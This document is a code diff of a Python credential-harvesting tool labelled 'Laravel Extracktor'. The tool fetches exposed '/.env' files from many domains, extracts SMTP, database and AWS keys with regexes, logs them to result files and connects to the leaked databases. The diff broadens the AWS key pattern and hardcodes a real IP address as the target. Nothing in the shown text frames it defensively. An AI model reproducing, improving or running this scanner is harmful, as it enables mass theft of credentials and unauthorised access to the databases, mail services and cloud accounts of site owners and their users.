@@ -87,7 +87,7 @@ def get_smtp(site, text):
                 k.write("DB_USERNAME:{}\n".format(db_username))
                 k.write("DB_PASSWORD:{}\n".format(db_password))
                 k.write('\n')
-                k.close()
+            k.close()
             if db_host != 'localhost' or db_host != '127.0.0.1':
                 db_conn = connect_db(site, db_host, db_port, db_database, db_username, db_password)
                 if db_conn:
@@ -126,7 +126,6 @@ def get_smtp(site, text):
             open('result/smtp/format_smtp.txt', 'a+', encoding='utf8').write(f"{mail_host}|{mail_port}|{mail_username}|{mail_password}\n")
             if 'awsamazon.com' in mail_host:
                 smtp_color = f"{green}AMAZON_SMTP{reset}|"
-                
             elif 'sendgrid.net' in mail_host:
                 smtp_color = f"{green}SENDGRID_SMTP{reset}|"
             else:
@@ -158,7 +157,9 @@ def get_smtp(site, text):
             sg = f"{red}SENDGRID{reset}|"
 
         if 'AWS_ACCESS_KEY_ID=' in text:
-            aws_key = re.findall(r'AWS_ACCESS_KEY_ID=([A-Za-z0-9]+)\nAWS_SECRET_ACCESS_KEY=([A-Za-z0-9/]+)\nAWS_DEFAULT_REGION=([A-Za-z0-9-]+)', text)
+            pattern = re.compile(r'AWS_[A-Z_]+=(\S+)')
+            #aws_key = re.findall(r'AWS_ACCESS_KEY_ID=(.*?)\nAWS_SECRET_ACCESS_KEY=(.*?)\nAWS_DEFAULT_REGION=(.*?)', text)
+            aws_key = pattern.findall(text)
             if aws_key:
                 aws_color = f"{green}AWS{reset}|"
                 aws_access_key = aws_key[0]
@@ -323,6 +324,7 @@ def connect_db(site, host, port, database, username, password):
                 k.write("DB_USERNAME:{}\n".format(username))
                 k.write("DB_PASSWORD:{}\n".format(password))
                 k.write('\n')
+            k.close()
             return True
         return False
     
@@ -339,7 +341,6 @@ def env(url):
             else:
                 site = uri+'/'+ph
             req = requests.get(site, headers=headers, verify=False, timeout=5, allow_redirects=False).text
-            #print(req)
             if 'APP_NAME' in req or 'MAIL_HOST' in req or 'DB_HOST' in req or 'APP_ENV' in req:
                 succes(site, 'Laravel')
                 open('result/laravel_site/laravel.txt', 'a+', encoding='utf8').write(site+'\n')
@@ -348,6 +349,7 @@ def env(url):
                     open('result/laravel_ip.txt', 'a+', encoding='utf8').write(ip+'\n')
                 except: 
                     pass
+                print(site)
                 get_smtp(site, req)
             else:
                 error(site, 'Laravel')
@@ -363,23 +365,25 @@ def create_folder():
 
 def main():
     global path, toemail
+    path = ['/.env']
     banner = f"""
 \t\t{yellow}Laravel Extracktor{reset}
 \t\t[CHANNEL] {red}@fiola_tools{reset}
 """
     try:
-        create_folder()
-        print(banner)
-        try:
-            path = open('path.txt', 'r', encoding='utf8').read().splitlines()
-        except FileNotFoundError:
-            path = ['/.env']
+        # create_folder()
+        # print(banner)
+        # try:
+        #     path = open('path.txt', 'r', encoding='utf8').read().splitlines()
+        # except FileNotFoundError:
+        #     path = ['/.env']
         try: email = open('email.txt', 'r', encoding='utf8').read(); toemail = re.search(r"[\w.+-]+@[\w-]+\.[\w.-]+", email).group(0)
         except FileNotFoundError: print(f"{red}ERROR{reset}: email.txt not found"); sys.exit()
-        domain = list(dict.fromkeys(open(input("- Domain List : "), encoding='utf8').read().splitlines()))
-        thread = int(input("- Thread : "))
-        with ThreadPoolExecutor(max_workers=thread) as j:
-            j.map(env, domain)
+        # domain = list(dict.fromkeys(open(input("- Domain List : "), encoding='utf8').read().splitlines()))
+        # thread = int(input("- Thread : "))
+        # with ThreadPoolExecutor(max_workers=thread) as j:
+        #     j.map(env, domain)
+        env("http://34.222.216.205")
 
     except FileNotFoundError: print("ERROR: File Not Found.")
     #except Exception as e: print(f"ERROR: {e}")
